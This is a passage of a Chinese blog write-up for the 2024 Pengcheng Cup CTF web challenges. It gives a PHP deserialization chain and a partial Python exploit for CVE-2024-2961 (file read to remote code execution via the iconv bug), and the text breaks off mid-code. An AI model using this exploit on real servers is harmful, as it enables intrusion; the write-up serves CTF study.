<!DOCTYPE html>
<html lang="en">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  <link rel="icon" href="/images/favicon.ico">
  
  <title>2024鹏城杯线上赛Web方向题解 | Err0r233</title>
  <meta name="author" content="Err0r2333" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="Web" />
  
  <meta name="description" content="web美美下班，强度很适合我">
<meta property="og:type" content="article">
<meta property="og:title" content="2024鹏城杯线上赛Web方向题解">
<meta property="og:url" content="http://example.com/posts/10200.html">
<meta property="og:site_name" content="Err0r233">
<meta property="og:description" content="web美美下班，强度很适合我">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/favicon.ico">
<meta property="article:published_time" content="2024-11-09T15:44:04.000Z">
<meta property="article:modified_time" content="2024-11-09T16:35:40.467Z">
<meta property="article:author" content="Err0r2333">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/favicon.ico">
  
  <!-- 站点验证相关 -->
  
    
    
    
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
    <script src="/js/kr-dark.min.js"></script>
  
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
  
  
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
  
  
    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
  
  
    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
  
    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('/images/banner3.png');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('/images/Iceartory.jpg');
        }
      }
    
  </style>
  
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
</head>



    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    
                                    
                                        
                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
                                        
                                    
                                        
                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
                                        
                                    
                                        
                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
                                        
                                    
                                        
                                            <li>
                                                <a><i class="fa fa-link"></i>链接</a>
                                                <ul class="sub-menu">
                                                    
                                                        
                                                    
                                                </ul>
                                            </li>
                                        
                                    
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">Err0r233</a></div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>Err0r233</h2> <br />
                        <span>Err0r233的个人博客</span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">
                    

        

        

            <section class="col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    
    <link itemprop="mainEntityOfPage" href="http://example.com/posts/10200.html">
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center" itemprop="name headline">2024鹏城杯线上赛Web方向题解</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><time datetime="2024-11-09T15:44:04.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-11-09</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
                </li>
                <li>
                    <i class="fa fa-edit"></i> 
                    
                    
                        ~55.05K
                    
                    字
                </li>
                
                    <li id="/posts/10200.html" class="leancloud_visitors" data-flag-title="2024鹏城杯线上赛Web方向题解">
                        <i class="fa fa-eye"></i>
                        <span class="leancloud-visitors-count"> </span> 次阅读
                    </li>
                    
                
            </ul>
        </header>
        <div class="kratos-post-content">
            
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                <div class="icon"><i class="fa fa-warning"></i></div>
                <div class="text"><p>本文最后编辑于 <time datetime="1731170140467"></time> 前，其中的内容可能需要更新。</p></div>
            </div>
            
            
            
            <hr />
            <div itemprop="articleBody"><p>web美美下班，强度很适合我</p>
<span id="more"></span>
<h1><span id="fileread"> fileread</span></h1>
<p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls1</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cls</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$arr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;arr <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls2</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$filename</span> = <span class="string">&#x27;hello.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$txt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">           <span class="title function_ invoke__">var_dump</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">&#x27;fileput&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fileput</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$key</span>).<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fileput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your file:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">    <span class="variable">$cls</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">    <span class="variable">$instance</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cls</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>链子应该是：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cls1</span>:<span class="string">:wakeup-&gt; cls2::get -&gt; cls::fileput</span></span><br></pre></td></tr></table></figure>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls1</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cls</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$arr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;arr <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls2</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$filename</span> = <span class="string">&#x27;hello.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$txt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">           <span class="title function_ invoke__">var_dump</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">&#x27;fileput&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fileput</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$key</span>).<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fileput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your file:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> cls1;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> cls2;</span><br><span class="line"><span class="variable">$a</span>-&gt;cls = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;arr = <span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>=&gt;<span class="string">&quot;fileput&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;filename=<span class="string">&quot;your payload here&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接读<code>/flag</code>无权限，但是题目提供了<code>/readflag</code>，因此我们要进行rce，联系到<code>file_get_contents</code>的rce就必须是<code>from LFI to RCE</code>，也就是我们的<code>cve-2024-2961</code></p>
<img src="/posts/10200/1.PNG" class title="awa">
<p>不过原exp在这题的环境下进行交互比较困难，于是我弄到了一个手动版的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&lt;?php</span></span><br><span class="line"><span class="comment">#$file = $_REQUEST[&#x27;file&#x27;]; </span></span><br><span class="line"><span class="comment">#$data = file_get_contents($file);</span></span><br><span class="line"><span class="comment">#echo $data;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/kezibei/php-filter-iconv</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Region</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    start: <span class="built_in">int</span></span><br><span class="line">    stop: <span class="built_in">int</span></span><br><span class="line">    permissions: <span class="built_in">str</span></span><br><span class="line">    path: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.stop - self.start</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_hex</span>(<span class="params">data</span>):</span><br><span class="line">    hex_string = binascii.hexlify(data).decode()</span><br><span class="line">    <span class="built_in">print</span>(hex_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunked_chunk</span>(<span class="params">data: <span class="built_in">bytes</span>, size: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span></span><br><span class="line"><span class="string">    chunked representation has size `size`.</span></span><br><span class="line"><span class="string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span></span><br><span class="line">    <span class="comment"># enough</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(data) + <span class="number">8</span></span><br><span class="line">    keep = <span class="built_in">len</span>(data) + <span class="built_in">len</span>(<span class="string">b&quot;\n\n&quot;</span>)</span><br><span class="line">    size = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> size.encode() + <span class="string">b&quot;\n&quot;</span> + data + <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compressed_bucket</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> chunked_chunk(data, <span class="number">0x8000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Remove 2-byte header and 4-byte checksum</span></span><br><span class="line">    <span class="keyword">return</span> zlib.compress(data, <span class="number">9</span>)[<span class="number">2</span>:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ptr_bucket</span>(<span class="params">*ptrs, size=<span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ptrs) * <span class="number">8</span> == size</span><br><span class="line">    bucket = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">map</span>(p64, ptrs))</span><br><span class="line">    bucket = qpe(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = compressed_bucket(bucket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bucket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpe</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;=<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data).upper().encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64</span>(<span class="params">data: <span class="built_in">bytes</span>, misalign=<span class="literal">True</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    payload = base64.b64encode(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> misalign <span class="keyword">and</span> payload.endswith(<span class="string">&quot;=&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Misaligned: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_get_region</span>(<span class="params">regions, *names</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> region <span class="keyword">in</span> regions:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(name <span class="keyword">in</span> region.path <span class="keyword">for</span> name <span class="keyword">in</span> names):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        failure(<span class="string">&quot;Unable to locate region&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_main_heap</span>(<span class="params">regions</span>):</span><br><span class="line">    <span class="comment"># Any anonymous RW region with a size superior to the base heap size is a</span></span><br><span class="line">    <span class="comment"># candidate. The heap is at the bottom of the region.</span></span><br><span class="line">    heaps = [</span><br><span class="line">        region.stop - HEAP_SIZE + <span class="number">0x40</span></span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> <span class="built_in">reversed</span>(regions)</span><br><span class="line">        <span class="keyword">if</span> region.permissions == <span class="string">&quot;rw-p&quot;</span></span><br><span class="line">        <span class="keyword">and</span> region.size &gt;= HEAP_SIZE</span><br><span class="line">        <span class="keyword">and</span> region.stop &amp; 